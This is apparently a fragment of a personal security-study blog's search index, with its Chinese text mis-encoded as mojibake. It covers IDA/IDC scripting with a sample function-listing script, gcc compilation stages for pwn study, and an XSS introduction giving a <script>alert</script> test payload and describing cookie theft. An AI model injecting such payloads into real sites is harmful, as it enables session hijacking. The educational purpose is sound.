IDCè„šæœ¬è¯­è¨€å®˜æ–¹æ•™ç¨‹\nIDA-IDCè„šæœ¬ç¼–å†™è¯­æ³•\nIDA Python\nIDAPythonåˆå­¦è€…æŒ‡å—ï¼šæœ¬åœ°ç‰ˆæœ¬[here](./IDAPython åˆå­¦è€…æŒ‡å—.pdf)\nIDAPython Docsï¼šhex-rayså®˜æ–¹æ–‡æ¡£\nIDA-pythonå­¦ä¹ å°ç»“\nIDAPYTHON --- IDA è„šæœ¬\nâ€‹\tIDAPython å‡½æ•°\nIDApythonæ’ä»¶ç¼–å†™åŠè„šæœ¬æ‰¹é‡åˆ†ææ•™ç¨‹\n æˆ‘è§£åˆ°äº†IDAè„šæœ¬ä¸»è¦æœ‰IDA python å’Œ IDC\nIDCè„šæœ¬è¯­è¨€æ˜¯ä¸€ç§ç±»ä¼¼Cçš„è„šæœ¬è¯­è¨€ï¼Œå’ŒCè¯­è¨€æœ‰ç€ç±»ä¼¼çš„è¯­è¨€æ ‡è®°ã€‚ç„¶è€Œï¼Œç”±äºIDCæ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œå°±æ— æ³•åŒ…å«æŒ‡é’ˆè¿™æ ·çš„é«˜çº§ç‰¹æ€§äº†ï¼Œä½†æ˜¯æ‰€æœ‰çš„å˜é‡ç±»å‹ï¼Œè„šæœ¬è§£é‡Šå™¨éƒ½æ˜¯å¯ä»¥æ”¯æŒçš„ã€‚IDCä¸­çš„å˜é‡æ˜¯å¼±ç±»å‹çš„ï¼Œä¸€ä¸ªå˜é‡å¯ä»¥ä¿å­˜ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› æ­¤å˜é‡å£°æ˜çš„æ—¶å€™æ˜¯ä¸éœ€è¦æŒ‡å®šå˜é‡ç±»å‹çš„ï¼Œæ¯”å¦‚ä½ å¯ä»¥è¿™æ ·è¿›è¡Œå˜é‡å£°æ˜ï¼š auto myvar;\nIDA python ä¸ºIDAä¸­é›†æˆçš„pythonè§£é‡Šå™¨ï¼ˆç¾ä¸­ä¸è¶³çš„å°±æ˜¯ç›®å‰æ˜¯python2.7ç‰ˆæœ¬ï¼‰ï¼Œèƒ½å¤Ÿè°ƒç”¨æ‰€æœ‰çš„idcçš„å‡½æ•°ä»¥åŠæ‰€æœ‰pythonè„šæœ¬ï¼Œä»–å¯ä»¥å……åˆ†åˆ©ç”¨pythonçš„æ•°æ®å¤„ç†èƒ½åŠ›å’Œæ‰€æœ‰pythonæ¨¡å—\nè„šæœ¬çš„ç”¨å¤„å¾ˆå¤šï¼Œä»¥ç°åœ¨çš„æˆ‘çš„äº†è§£æ¥è¯´ï¼Œidaè„šæœ¬æœ€å¤šçš„ç”¨å¤„æ˜¯ç”¨æ¥è„±å£³å’Œå¯»æ‰¾pwnçš„æ˜“è¢«æ”»å‡»çš„å‡½æ•°\nä½¿ç”¨  shift + F2 ä¼šå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥å°†è„šæœ¬ç›´æ¥å†™åœ¨é‡Œé¢ï¼Œç‚¹runè¿è¡Œï¼Œå³File -\u003e Script Command èœå•æ ä¸­ File -\u003e Script fileè½½å…¥idcæ–‡ä»¶ï¼ŒåŒæ ·ï¼Œalt + F7  è¾“å‡ºåœ¨ä¸‹é¢çš„Output Windowé‡Œ\nIDC IDCè„šæœ¬è¯­è¨€å€Ÿç”¨äº†å¾ˆå¤šCè¯­è¨€çš„è¯­æ³•ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆå¿«å°±èƒ½ä¸Šæ‰‹\n  IDCå˜é‡   autoï¼š IDCå…³é”®å­—autoç”¨äºå¼•å…¥ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå¦‚auto var,addr;\n IDCè®¤å¯ä½¿ç”¨/* */çš„cè¯­è¨€é£æ ¼è¿›è¡Œå¤šè¡Œæ³¨é‡Šã€‚ ä¹Ÿä½¿ç”¨//çš„C++é£æ ¼è¿›è¡Œè¡Œå°¾æ³¨é‡Š ä½¿ç”¨;ä½œä¸ºç»ˆæ­¢ç¬¦ï¼ˆå’Œcè¯­è¨€ä¸­ä¸€æ ·ï¼‰ IDCå¹¶ä¸æ”¯æŒcé£æ ¼æ•°ç»„ç±»å‹ï¼ŒæŒ‡é’ˆ,ç»“æ„ä½“,è”åˆä¹‹ç±»ï¼Œå¤æ‚çš„æ•°æ®ç±»å‹  externï¼šIDAä½¿ç”¨externå…³é”®å­—å¼•å…¥å…¨å±€å˜é‡ç”³æ˜\n  è¡¨è¾¾å¼   IDCæ”¯æŒcä¸­çš„æ‰€æœ‰è¡¨è¾¾å¼å’Œé€»è¾‘è¿ç®—ç¬¦ï¼ŒåŒ…æ‹¬ä¸‰å…ƒè¿ç®—ç¬¦ï¼ˆï¼Ÿï¼šï¼‰ã€‚\næ”¯æŒé€—å·è¿ç®—ç¬¦ï¼Œä½†æ˜¯ ä¸æ”¯æŒ op=(+=,*=,\u003e\u003e=ç­‰)å¤åˆèµ‹å€¼è¿ç®—ç¬¦ã€‚\nä¸æ”¯æŒç®—æœ¯ç§»ä½ï¼Œå¦‚æœè¦ç§»ä½åªèƒ½ä¿®æ”¹æœ€é«˜ä½å’Œæœ€ä½ä½ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š\næä¾›åˆ†ç‰‡è¿ç®—ï¼Œä½¿ç”¨æ–¹æ‹¬å·å’Œå…¶å®ç´¢å¼•ï¼ˆåŒ…æ‹¬ï¼‰ä¸ç»“æŸç´¢å¼•ï¼ˆä¸åŒ…æ‹¬ï¼‰æ¥æŒ‡å®šè‡³å°‘ä¸€ä¸ªç´¢å¼•ã€‚è¿™ä¸ªå°±åƒpythonæ•°ç»„ä¸€æ ·ï¼Œæ¯”å¦‚s1 = str[7:9]ã€s2 = str[:6]ã€s3 = str[10:]\n  IDCè¯­å¥   è¯­å¥ä»¥åˆ†å·ç»“å°¾ï¼Œä½†æ˜¯ä¸æ”¯æŒå¤åˆè¯­å¥ã€‚\nå¼•å…¥try/catchå—å’Œç›¸å…³çš„throwè¯­å¥ï¼Œç›¸å½“ä¸C++çš„å¼‚å¸¸å¤„ç†ã€‚\nä½¿ç”¨å’ŒCè¯­è¨€ä¸€æ ·çš„èŠ±æ‹¬å·å’Œè¯­ä¹‰ã€‚åœ¨èŠ±æ‹¬å·ä¸­å¯ä»¥ç”³æ˜å˜é‡ï¼Œç”³æ˜å˜é‡å¿…é¡»ä½äºèŠ±æ‹¬å·å†…çš„ç¬¬ä¸€æ¡è¯­å¥ã€‚\nMessageç±»ä¼¼äºcè¯­è¨€ä¸­çš„print\n  IDCå‡½æ•°    .idcæ–‡ä»¶æ”¯æŒç”¨æˆ·å®šä¹‰çš„å‡½æ•°ã€‚ IDCå‘½ä»¤å¯¹è¯æ¡†ä¸æ”¯æŒç”¨æˆ·å®šä¹‰çš„å‡½æ•°ã€‚ ä½¿ç”¨staticå£°æ˜ç”¨æˆ·å®šä¹‰çš„å‡½æ•°ã€‚ å‡½æ•°çš„å‚æ•°åˆ—è¡¨ä»¥é€—å·éš”å¼€ã€‚    è‹¥éœ€è¦è¿”å›å€¼ ï¼Œä½¿ç”¨return\n å¯ä»¥å°†å‡½æ•°çš„å¼•ç”¨ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å°†å‡½æ•°å¼•ç”¨çš„ä½œä¸ºå‡½æ•°çš„ç»“æœè¿”å›ã€‚    main()å‡½æ•°ä¾æ—§ä¸ºå‡½æ•°å…¥å£\n  IDCç¨‹åº    å½“æ‰§è¡Œå¤§é‡çš„IDCè¯­å¥çš„æ—¶å€™ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„IDCç¨‹åºæ–‡ä»¶ã€‚ IDCç¨‹åºæ–‡ä»¶ï¼Œè‡³å°‘å®šä¹‰ä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„mainå‡½æ•°ã€‚ IDCæ–‡ä»¶å¿…é¡»åŒ…å«**#include\u003cidc.idc\u003e **è¿™ä¸ªæ–‡ä»¶ï¼Œç”±æ­¤è·å¾—å®å®šä¹‰ã€‚  æ‹¿è€å¸ˆç»™çš„ç¤ºä¾‹ç¨‹åºæ¥è¯´\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  #include \u003cidc.idc\u003e /* //part1:helloworld static main(){ //Wait(); Message(\"Hello world\"); //Exit(0); return 0; } */ //part2:see segment  static list_segs() {\tauto ea, i=0; ea = FirstSeg(); while (ea != BADADDR) {\tMessage(\"\\nsegment %d 0x%08X-0x%08X\\n\", i, ea, SegEnd(ea)); list_func_with_ref(ea); ea = NextSeg(ea); i++; }\t} /* static main() {\t//Wait(); list_segs(); //func_list_ref();\tMessage(\"\\n\\n bye \\n\\n\");\t//Exit(0); } */ //part3:see function  static list_func_with_ref(ea) { auto func; func = SegStart(ea); //Message(\"first addr is %x\\n\", func); // note: first address maybe not a func  while (func != BADADDR \u0026\u0026 func \u003c SegEnd(ea)) { if (GetFunctionFlags(func) != -1) // if really a func  { auto ref, tip; if (func\u003e=SegStart(ea) \u0026\u0026 func\u003cSegEnd(ea)) tip = \"Internal\"; else tip = \"External\"; Message(\"%s Function 0x%08X %s\\n\", tip, func, GetFunctionName(func)); for (ref=RfirstB(func); ref != BADADDR; ref=RnextB(func, ref)) { auto caller_name, caller_addr; caller_name = GetFunctionName(ref); caller_addr = GetFunctionAttr(ref, FUNCATTR_START); Message(\" called at 0x%08X by 0x%08X(%s)\\n\", ref, caller_addr, caller_name); } } func=NextFunction(func); } } static main() {\tMessage(\"Hello!\"); //Wait(); \tlist_segs(); auto ea; //ea = FirstSeg(); \t//list_func_with_ref(ea);\t\tMessage(\"\\n\\nbye \\n\\n\");\t//Exit(0); }   é¦–å…ˆåœ¨å¤´éƒ¨å¼•å…¥#include \u003cidc.idc\u003eï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„ï¼ŒåŒ…å«äº†idcé‡Œé¢çš„å®å®šä¹‰\nFirstSeg()è·å–ç¬¬ä¸€ä¸ªSegmentæ®µçš„åœ°å€ï¼Œç„¶åè°ƒç”¨list_ref_functionå±•ç¤ºå…¶ä¸­çš„å‡½æ•°ï¼Œå°†æ­¤è¿‡ç¨‹è¿›è¡Œå¾ªç¯æ¯ä¸€ä¸ªsegment\nlist_ref_functionï¼šé€šè¿‡GetFunctionFlagsæ¥åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªåœ°å€æ˜¯å¦æœ‰å‡½æ•°å¼€å§‹æ ‡å¿—ï¼Œæ¥è·å–å‡½æ•°çš„åœ°å€å’Œåå­—ï¼Œå¹¶ç”¨Messageå‡½æ•°æ‰“å°å‡ºæ¥\nIDA Python IDA Python ç”±ä¸‰ä¸ªåˆ†ç¦»çš„æ¨¡å—ç»„æˆ,ä»–ä»¬åˆ†åˆ«æ˜¯ idc,idautils å’Œ idaapiã€‚\nidc:è¿™æ˜¯å…¼å®¹idcå‡½æ•°çš„æ¨¡å— idautils:å¾ˆä½¿ç”¨çš„ä¸€ä¸ªæ¨¡å—ï¼Œå¤§å¤šæ•°å¤„ç†éƒ½æ˜¯éœ€è¦ä¾æ‰˜äºè¿™ä¸ªæ¨¡å— idaapi:å…è®¸ä½¿ç”¨è€…é€šè¿‡ç±»çš„å½¢å¼ï¼Œè®¿é—®æ›´å¤šåº•å±‚çš„æ•°æ® IDA Python çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒèƒ½éå†æ‰€æœ‰çš„æŒ‡ä»¤,æ‰€æœ‰çš„äº¤å‰å¼•ç”¨åœ°å€,è¿˜æœ‰æœç´¢æ‰€æœ‰çš„ä»£ç å’Œæ•°æ®ã€‚\nä¸€äº›åŠŸèƒ½  æŒ‡ä»¤å¤„ç†\n  è·å–å½“å‰æŒ‡ä»¤åœ°å€ï¼šea=here() print â€œ0x%x %sâ€%(ea,ea) è·å–å½“å‰çš„æ±‡ç¼–æŒ‡ä»¤ï¼šidc.GetDisasm(ea) è·å–å½“å‰å¤„äºçš„æ®µï¼šidc.SegName() è·å–è¯¥æ®µç¨‹åºæœ€ä½å’Œæœ€é«˜åœ°å€ï¼šhex(MinEA()) hex(MaxEA()) è·å–ä¸‹(ä¸Š)ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤åœ°å€ï¼šea = here() ; next_instr = idc.NextHead(ea) PrevHead(ea)   å‡½æ•°æ“ä½œ\n   è·å–ç¨‹åºæ‰€æœ‰å‡½æ•°çš„åç§°ï¼š\nfor func in idautils.Functions(): print hex(func), idc.GetFunctionName(func)   è®¡ç®—å½“å‰å‡½æ•°æœ‰å¤šå°‘æ¡æŒ‡ä»¤\nea = here() len(list(idautils.FuncItems(ea)))   è·å–å½“å‰IDBä¸­è®°å½•çš„æ‰€æœ‰æœ‰åå­—å‡½æ•°çš„åœ°å€å’Œåç§°ï¼š idautils.Names() è¿”å›çš„æ˜¯ä¸€ä¸ªä»¥å…ƒç»„ç»„æˆçš„åˆ—è¡¨ï¼Œå‡½æ•°çš„èµ·å§‹åœ°å€æŒ‡å‘äº†å…¶pltè¡¨   æŒ‡ä»¤æ“ä½œ\n  ç»™å®šåœ°å€ï¼Œæ‰“å°æŒ‡ä»¤ idc.GetDisasm(ea) ç»™å®šå‡½æ•°ä¸­ä¸€ä¸ªåœ°å€ï¼Œå¾—åˆ°æ•´ä¸ªå‡½æ•°çš„æŒ‡ä»¤åˆ—è¡¨ idautils.FuncItems(here()) è·å–å‡½æ•°çš„ä¸€äº›flagä¿¡æ¯ï¼š idc.GetFunctionFlags(func) å¯¹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤è¿›è¡Œæ‹†è§£ï¼š è·å–æŒ‡ä»¤çš„æ“ä½œï¼šidc.GetMnem(here()) è·å–æŒ‡ä»¤çš„æ“ä½œæ•°ï¼šidc.GetOpType(ea,n) æ ¹æ®è¿”å›çš„æ•°å€¼ï¼Œå¯ä»¥åˆ¤æ–­æ“ä½œæ•°ç±»å‹ï¼ˆæ™®é€šå¯„å­˜å™¨ã€å¸¸é‡å­—ç¬¦ä¸²ç­‰ï¼‰ å¯¹æ±‡ç¼–æŒ‡ä»¤ä¸­ç”¨åˆ°çš„æ“ä½œæ•°ï¼Œæ±‚å–å…¶å¼•ç”¨çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯åŒå‡»è¯¥æ“ä½œæ•°åè·³è½¬åˆ°çš„åœ°å€ hex(idc.GetOperandValue(here(),1))   äº¤å‰å¼•ç”¨\n  æŒ‡ä»¤ä»å“ªä¸ªåœ°æ–¹æ¥ï¼šidautils.CodeRefsTo(here(),0) æŒ‡ä»¤ä¸‹ä¸€æ­¥å»åˆ°å“ªå„¿ï¼šidautils.CodeRefsFrom(here(),0) æ•°æ®ä»å“ªä¸ªåœ°æ–¹æ¥ï¼šidautils.DataRefsTo(here(),0) æ•°æ®ä¸‹ä¸€æ­¥å»åˆ°å“ªå„¿ï¼šidautils.DataRefsFrom(here(),0) è¾ƒä¸ºé€šç”¨çš„ä¸€ç§è·å–xrefï¼šidautils.XrefsTo(here(),flag) å…¶ä¸­flag=0æ—¶ï¼Œæ‰€æœ‰çš„äº¤å‰å¼•ç”¨éƒ½ä¼šè¢«æ˜¾ç¤º  ","description":"About IDA Script","tags":["reverse","IDA"],"title":"IDA-Script","uri":"/posts/ida-script/"},{"categories":["pwn"],"content":"Pwn  å‚è€ƒï¼š\nhttps://mp.weixin.qq.com/s/JovqFitTQj4M37su_lH--g\nPwnå­¦ä¹ \næ¼æ´å¹³å° https://bbs.h-acker.net/?p=69\nhttps://www.jarvisoj.com/\nabout plt \u0026 got: https://blog.csdn.net/linyt/article/details/51635768\n 0x00 åº å…³äºPwnçš„å‰ç½®æŠ€èƒ½\nä»Cè¯­è¨€åˆ°å¯æ‰§è¡Œç¨‹åº æˆ‘ä»¬ä¸€èˆ¬ç¼–è¯‘ï¼Œç›´æ¥gcc -o test test.cå°±ç¼–è¯‘å‡ºå¯æ‰§è¡Œç¨‹åºå¯ä»¥ç›´æ¥è·‘äº†\nä¸è¿‡ç¼–è¯‘å¹¶æ²¡æœ‰è¡¨é¢ä¸Šä¸€æ¡å‘½ä»¤è¿™ä¹ˆç®€å•ï¼Œé€šè¿‡ä¸Šå­¦æœŸçš„ç¼–è¯‘åŸç†æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œç¼–è¯‘è¦ç»è¿‡è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æç­‰ç­‰ï¼Œç»è¿‡ç¼–è¯‘å™¨çš„å‰ç«¯ç”Ÿæˆæœªç»ä¼˜åŒ–è¿‡çš„ä¸­é—´ä»£ç ï¼Œç„¶åå†ç”±åç«¯ä¼˜åŒ–ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºçš„æ±‡ç¼–ä»£ç ï¼Œå†è¿›ä¸€æ­¥è½¬æˆå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç ï¼ˆæœºå™¨ç ï¼‰\nå¦‚ä¸Šå›¾ï¼Œä¸ºgccç¼–è¯‘çš„è¿‡ç¨‹ï¼šç¼–è¯‘ï¼Œæ±‡ç¼–ï¼Œé“¾æ¥\n å…¶å®è¿˜å°‘äº†ä¸€éƒ¨åˆ†â€”â€”é¢„ç¼–è¯‘ï¼šp1.cï¼Œp2.cç»è¿‡é¢„ç¼–è¯‘gcc -E p1.c p2.cç”Ÿæˆp1.iï¼Œp2.i\næ­¤é˜¶æ®µä¸»è¦å®Œæˆ#ç¬¦å·åé¢çš„å„é¡¹å†…å®¹åˆ°æºæ–‡ä»¶çš„æ›¿æ¢ï¼Œä¾‹å¦‚å¤´æ–‡ä»¶#includeå’Œå®å®šä¹‰#define, #ifdefç­‰ã€‚ å¯ä»¥ç”¨gccçš„å‚æ•°-Eæ¥æŒ‡ç¤ºç¼–è¯‘å™¨åªåšé¢„å¤„ç†è€Œä¸è¿›è¡Œä¸‹é¢çš„ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥ä¸‰ä¸ªåŠ¨ä½œ\nç¼–è¯‘ï¼šgcc -S p1.i p2.i -o p1.s p2.s\n  .S ï¼šé¢„å¤„ç†ï¼Œç¼–è¯‘\n  .sï¼šç¼–è¯‘\n     ç¼–è¯‘ï¼šæŠŠæºç¨‹åºå¤„ç†æˆæ±‡ç¼–ä»£ç \n  gcc -S p1.c -o p1.s\n   è¯æ³•åˆ†æ\nè¯­æ³•åˆ†æ\nä¸­é—´ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–\nç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–\n     æ±‡ç¼–ï¼šå°†æ±‡ç¼–ä»£ç å¤„ç†æˆå­—èŠ‚ç ï¼Œå³æ±‡ç¼–å‘½ä»¤çš„01ä¸²ç¿»è¯‘\n  gcc -C p1.s -o p1.o\n   è¯­æ³•åˆ†æ\nåŠ©è®°ç¬¦è½¬ä¸ºæ“ä½œç \nç«‹å³æ•°ã€æ ‡å·ã€åœ°å€è½¬ä¸ºæ“ä½œæ•°\nç”Ÿæˆç›®æ ‡æ–‡ä»¶\n   gccæˆ–asæˆ–nasmæ±‡ç¼–å™¨éƒ½å¯ä»¥å®ç°\n    æˆ‘ä»¬ä¸€èˆ¬é˜…è¯»çš„éƒ½æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºï¼ˆæ¯”å¦‚æ‰€è¯´çš„74/75ç ´è§£ï¼‰\n  é“¾æ¥ï¼šå°†å¤šä¸ªç›®æ ‡æ–‡ä»¶æˆ–åº“æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œç¨‹åº\n  gcc p1.o -o p1\n   å°†å¤šä¸ªç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ä¸­çš„ä»£ç ã€æ•°æ®çš„ä¿¡æ¯åˆå¹¶\nä¿®å¤æ–‡ä»¶ä¹‹é—´çš„å¼•ç”¨å…³ç³»ï¼šæ ¸å¿ƒä½œç”¨\nç”Ÿæˆå¯æ‰§è¡Œç¨‹åº\né™æ€åº“ä¸­çš„ä»£ç å’Œæ•°æ®ä¼šå®Œæ•´æ‹·è´åˆ°å¯æ‰§è¡Œç¨‹åºï¼Œè€ŒåŠ¨æ€åº“åˆ™éœ€è¦å†ç¨‹åºè¿è¡Œæ—¶é€šè¿‡åŠ¨æ€é“¾æ¥çš„æ–¹å¼åŠ è½½\n  åº“æ–‡ä»¶ï¼šå¯å¤ç”¨çš„ä»£ç é›†åˆï¼Œä»¥ä¾›ä½¿ç”¨è€…è°ƒç”¨\n é™æ€åº“ï¼š.a åŠ¨æ€åº“ï¼š.soã€.dllï¼šèŠ‚çº¦æ–‡ä»¶å†…å­˜ã€æ“ä½œç³»ç»Ÿçš„è¿è¡Œæ—¶çš„å†…å­˜         å¦‚ä¸Šå›¾ï¼Œé“¾æ¥å°†sum.oã€main.oã€libprint.aä¸‰ä¸ªç›®æ ‡ä»£ç æ•´åˆè‡³å¯æ‰§è¡Œç¨‹åºa.outé‡Œ\nè¿™å°±æ˜¯é“¾æ¥çš„è¿‡ç¨‹\næœºå™¨æŒ‡ä»¤å¦‚ä½•æ‰§è¡Œ ","description":"Something about pwn!","tags":["ctf","pwn","security"],"title":"pwn-learning","uri":"/posts/pwn-learning/"},{"categories":["web"],"content":"XSS è·¨ç«™è„šæœ¬æ”»å‡» ä¸ŠèŠ‚è¯¾ï¼Œè€å¸ˆè®²äº†æœ‰å…³XSSçš„æ”»å‡»ï¼Œæˆ‘ä»¬ä¾¿åœ¨è¿™å¤ä¹ ä¸€æ³¢\n ä¸»è¦å‚è€ƒï¼š\nè€å¸ˆçš„pptä»¥åŠctf-wiki\nGoogle Security - XSS\nctf-wiki : XSS Cross-site Scripting Attack\nè·¨ç«™è„šæœ¬æ¼æ´(XSS)åŸºç¡€è®²è§£\nå‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ\næµ…è°ˆXSSæ”»å‡»çš„é‚£äº›äº‹ï¼ˆé™„å¸¸ç”¨ç»•è¿‡å§¿åŠ¿ï¼‰\n ç„¶åè¿™è¾¹æœ‰ä¸€ä¸ªåœ¨çº¿çš„xssé¶åœºï¼šthe XSS game\nXSSç®€ä»‹ ä»€ä¹ˆæ˜¯XSSï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒCross-Site Scriptingï¼Œä¸ºäº†å’ŒCSS(å±‚å æ ·å¼è¡¨)åŒºåˆ†å¼€æ¥ï¼ŒæŠŠç¬¬ä¸€ä¸ªå­—æ¯Cæ”¹æˆäº†Xï¼Œä¹Ÿå°±æ˜¯ç°åœ¨æ‰€è¯´çš„XSSæ”»å‡»\nè·¨ç«™è„šæœ¬ï¼ˆCross-Site Scriptingï¼ŒXSSï¼‰æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨ WEB åº”ç”¨ç¨‹åºä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œæ˜¯ç”±äº WEB åº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸è¶³è€Œäº§ç”Ÿçš„ã€‚æ”»å‡»è€…åˆ©ç”¨ç½‘ç«™æ¼æ´æŠŠæ¶æ„çš„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™äº›ç½‘é¡µæ—¶ï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå¯¹å—å®³ç”¨æˆ·å¯èƒ½é‡‡å– Cookies èµ„æ–™çªƒå–ã€ä¼šè¯åŠ«æŒã€é’“é±¼æ¬ºéª—ç­‰å„ç§æ”»å‡»ã€‚\nXSSåˆ†ç±» XSSä¸»è¦åˆ†ä¸º3ç§ï¼Œåˆ†åˆ«æ˜¯åå°„æ€§XSSã€æŒä¹…æ€§XSS(å­˜å‚¨å‹XSS)ã€DOM XSS\n  åå°„æ€§XSS   æœ€ç»å…¸çš„åå°„æ€§XSSï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨ä¸€ä¸ªå¯¹è¯æ¡†é‡Œè¾“å…¥\u003cscript\u003ealert('Hello, XSS!')\u003c/script\u003e\nç„¶åè·³å‡ºä¸€ä¸ªå‘ä½ æ‰“æ‹›å‘¼çš„XSSå¯¹è¯æ¡†\nåå°„å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š\n æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URL æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä» URL ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚  åå°„å‹ XSS æ¼æ´å¸¸è§äºé€šè¿‡ URL ä¼ é€’å‚æ•°çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ã€è·³è½¬ç­‰ã€‚\nç”±äºéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„ URL æ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚\nå¦‚å›¾ï¼Œæ”»å‡»è€…ç»™å‡ºä¸€ä¸ªè¯±ä½¿ä½ ç‚¹è¿›å»çš„è¶…é“¾æ¥ï¼ˆåŒ…å«è„šæœ¬ï¼‰(1)ï¼Œç”¨æˆ·ç‚¹è¿›å»è¯¥ç½‘ç«™(2\u00263)ï¼ŒæœåŠ¡å™¨å°†è¯¥è¯·æ±‚è¿”å›ç»™ç”¨æˆ·ï¼Œè¿”å›çš„é¡µé¢å½¢æˆvictim's browseré‡Œçš„å†…å®¹ï¼Œç„¶åæ‰§è¡Œäº†è„šæœ¬ï¼Œå°†è‡ªèº«çš„cookieå‘é€ç»™æ”»å‡»è€…\n  å­˜å‚¨å‹XSS   å­˜å‚¨å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š\n æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚ ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚  è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ã€è¯„è®ºåŒºã€ç”¨æˆ·ç§ä¿¡ç­‰ã€‚\nå¦‚å›¾ï¼Œå¾ˆç®€å•çš„åœ¨ä¸€ä¸ªè¯„è®ºåŒºé‡Œï¼Œæ”»å‡»è€…åœ¨è¯„è®ºåŒºè¿›è¡Œè¯„è®ºäº†ä¸€ä¸ªè„šæœ¬(1)ï¼Œæ­¤æ—¶ï¼ŒæœåŠ¡å™¨å°†è¿™ä¸ªè„šæœ¬å­˜å‚¨ä¸‹æ¥ï¼Œå¹¶ä½œä¸ºè¯„è®ºå±•ç¤ºç»™æ¯ä¸ªç”¨æˆ·ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¯„è®ºæ—¶(2\u00263)ï¼ŒæœåŠ¡å™¨å°†è„šæœ¬è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·åŠ 